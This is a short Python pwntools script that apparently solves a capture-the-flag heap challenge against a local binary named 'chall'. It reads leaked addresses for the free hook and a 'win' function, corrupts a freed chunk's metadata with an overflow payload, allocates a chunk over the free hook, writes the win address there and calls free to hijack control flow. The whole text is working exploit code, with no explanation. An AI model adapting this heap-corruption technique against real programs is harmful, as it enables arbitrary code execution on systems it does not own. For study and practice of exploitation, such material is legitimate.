from pwn import *
import time

def write(text):
    io.sendlineafter(b'> ', b'1')
    time.sleep(0.1)
    io.send(text)

def malloc(text):
    io.sendlineafter(b'> ', b'2')
    time.sleep(0.1)
    io.send(text)

def free():
    io.sendlineafter(b'> ', b'3')

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

io.recvuntil(b': ')
free_hock = int(io.recvline().strip(), 16)
io.recvuntil(b': ')
win = int(io.recvline().strip(), 16)

malloc(b'hello')

free()

payload = b'a' * 0x18
payload += p64(0x31)
payload += p64(free_hock)
write(payload)

malloc(b'hello')

free()

malloc(p64(win))

free()

io.interactive()
